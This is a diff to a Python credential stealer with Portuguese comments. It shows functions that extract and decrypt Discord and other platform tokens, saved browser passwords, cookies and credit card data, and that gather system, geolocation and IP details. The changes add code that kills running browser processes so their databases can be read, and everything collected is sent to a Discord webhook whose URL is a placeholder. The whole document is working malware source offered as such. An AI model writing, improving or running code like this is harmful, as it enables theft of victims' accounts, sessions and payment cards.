@@ -13,6 +13,8 @@ import platform
 import uuid
 import sqlite3
 import tempfile
+import psutil
+import time
 
 # Obtendo os diretórios do sistema
 local = os.getenv('LOCALAPPDATA')
@@ -84,13 +86,24 @@ def decrypt_token(buff, master_key):
     except:
         return None
 
+# Função para encerrar processos do navegador para evitar erros de permissão
+def close_browser_process(browser_name):
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'].lower() == browser_name.lower():
+            try:
+                proc.kill()
+                print(f"Processo {browser_name} encerrado.")
+            except psutil.NoSuchProcess:
+                pass
+            except psutil.AccessDenied:
+                print(f"Erro: Acesso negado ao processo {proc.info['pid']}.")
+
 # Função ajustada para extrair tokens de várias plataformas
 def get_tokens(path):
-    tokens = set()  # Usar um conjunto para evitar duplicatas
+    tokens = set()
     lev_db = rf"{path}\Local Storage\leveldb"
     loc_state = rf"{path}\Local State"
 
-    # Verificando se o arquivo Local State existe para descriptografar tokens
     if os.path.exists(loc_state):
         print(f"Local State encontrado em: {loc_state}")
         try:
@@ -102,36 +115,28 @@ def get_tokens(path):
             print(f"Erro ao obter a chave mestra: {e}")
             return list(tokens)
 
-        # Processando arquivos de nível do banco de dados do Discord/Steam/etc.
         if os.path.exists(lev_db):
-            print(f"Diretório LevelDB encontrado: {lev_db}")
             for file_name in os.listdir(lev_db):
                 if file_name.endswith((".ldb", ".log", ".sqlite")):
                     try:
-                        print(f"Processando arquivo: {file_name}")
                         with open(os.path.join(lev_db, file_name), "r", errors='ignore') as files:
                             for line in files.readlines():
                                 line = line.strip()
-
-                                # Regex para tokens padrão e MFA (multifator)
                                 token_match = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                                 mfa_match = re.findall(r'mfa\.[\w-]{84}', line) + re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25}', line)
 
-
-                                # Tentativa de descriptografar tokens padrão
                                 for token in token_match:
                                     try:
                                         decrypted = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                                         if decrypted:
-                                            tokens.add(decrypted)  # Adiciona token ao conjunto
+                                            tokens.add(decrypted)
                                             print(f"Token padrão descriptografado: {decrypted}")
                                     except Exception as e:
                                         print(f"Erro ao descriptografar token padrão: {e}")
                                         continue
 
-                                # Tratando tokens MFA
                                 for token in mfa_match:
-                                    tokens.add(token)  # Tokens MFA não são criptografados
+                                    tokens.add(token)
                                     print(f"Token MFA encontrado: {token}")
                     except PermissionError as e:
                         print(f"Erro de permissão ao acessar {file_name}: {e}")
@@ -144,41 +149,13 @@ def get_tokens(path):
     else:
         print(f"Local State não encontrado em: {loc_state}. Tentando método sem criptografia.")
 
-        # Método antigo sem criptografia
-        if os.path.exists(path):
-            for file_name in os.listdir(path):
-                if file_name.endswith('.log') or file_name.endswith('.ldb'):
-                    try:
-                        print(f"Processando arquivo: {file_name}")
-                        with open(os.path.join(path, file_name), "r", errors='ignore') as files:
-                            for line in files.readlines():
-                                line = line.strip()
-
-                                # Regex para tokens padrão e MFA (sem criptografia)
-                                token_match = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
-                                mfa_match = re.findall(r'mfa\.[\w-]{84}', line) + re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25}', line)
-
-
-                                # Adicionando tokens padrão encontrados
-                                for token in token_match:
-                                    tokens.add(token)
-                                    print(f"Token padrão encontrado: {token}")
-
-                                # Adicionando tokens MFA encontrados
-                                for token in mfa_match:
-                                    tokens.add(token)
-                                    print(f"Token MFA encontrado: {token}")
-                    except Exception as e:
-                        print(f"Erro ao processar {file_name}: {e}")
-                        continue
-        else:
-            print(f"Caminho {path} não encontrado.")
-
-    return list(tokens)  # Retorna como uma lista
+    return list(tokens)
 
 # Função para descriptografar o conteúdo do navegador e extrair os dados
 def decrypt_browser(LocalState, LoginData, CookiesFile, name):
     message = ""
+    close_browser_process(name)  # Encerra o navegador antes de tentar descriptografar
+
     try:
         if os.path.exists(LocalState):
             with open(LocalState) as f:
@@ -232,8 +209,10 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
     return message.strip()
 
 # Função para extrair dados de cartão de crédito baseados em Chromium
-def extrair_cartao_credito(LocalState, LoginData):
+def extrair_cartao_credito(LocalState, LoginData, browser_name):
     message = ""
+    close_browser_process(browser_name)  # Encerra o navegador antes de tentar descriptografar
+
     try:
         if os.path.exists(LocalState):
             with open(LocalState, "r") as f:
@@ -281,9 +260,8 @@ def extrair_cartao_credito(LocalState, LoginData):
 
 # Função para enviar dados ao webhook
 def post_to(file_content):
-    webhook_url = "URL WEBHOOK"  # URL do webhook do Discord
+    webhook_url = "URL DO WEBHOOK"  # URL do webhook do Discord
 
-    # Enviar para Webhook do Discord
     try:
         response = requests.post(webhook_url, json={"content": file_content})
         if response.status_code in [200, 204]:
@@ -323,21 +301,18 @@ def extrair_ips():
 # Função principal para consolidar as informações e enviá-las
 def main():
     mensagem = ""
-    mensagens_adicionais = set()  # Conjunto para evitar mensagens duplicadas
+    mensagens_adicionais = set()
 
-    # Obter informações do sistema
     sys_info = get_system_info()
     for key, value in sys_info.items():
         mensagem += f"{key}: {value}\n"
 
-    # Coletar tokens
     tokens_info = main_tokens()
     if tokens_info:
-        mensagem += tokens_info + "\n"  # Incluindo os tokens coletados na mensagem principal
+        mensagem += tokens_info + "\n"
     else:
         mensagem += "Tokens não encontrados.\n"
 
-    # Coletar geolocalização e IPs
     geo_info = extrair_info_geografica()
     if geo_info.strip() and geo_info.strip() not in mensagens_adicionais:
         mensagem += geo_info + "\n"
@@ -348,7 +323,6 @@ def main():
         mensagem += ip_info + "\n"
         mensagens_adicionais.add(ip_info.strip())
 
-    # Descriptografar navegadores e extrair dados
     cartao_info = ""
     for name, path in browser_loc.items():
         browser_data = decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), name)
@@ -358,18 +332,15 @@ def main():
         else:
             mensagem += f"Nenhum dado encontrado para o navegador {name}.\n"
 
-        cartao_info += extrair_cartao_credito(Local_State(path), Login_Data(path)) + ""
+        cartao_info += extrair_cartao_credito(Local_State(path), Login_Data(path), name) + ""
 
-    # Verifica se existem informações de cartão de crédito
     if cartao_info.strip():
-        mensagem += cartao_info.strip()  # Mantém tudo em uma única linha
+        mensagem += cartao_info.strip()
     else:
         mensagem += "Nenhum cartão de crédito encontrado.\n"
 
-    # Enviar a mensagem consolidada para o Discord
     post_to(mensagem.strip())
 
-# Função que estava faltando, responsável por coletar tokens de várias plataformas
 def main_tokens():
     mensagem_tokens = ""
     for platform, path in tokenPaths.items():
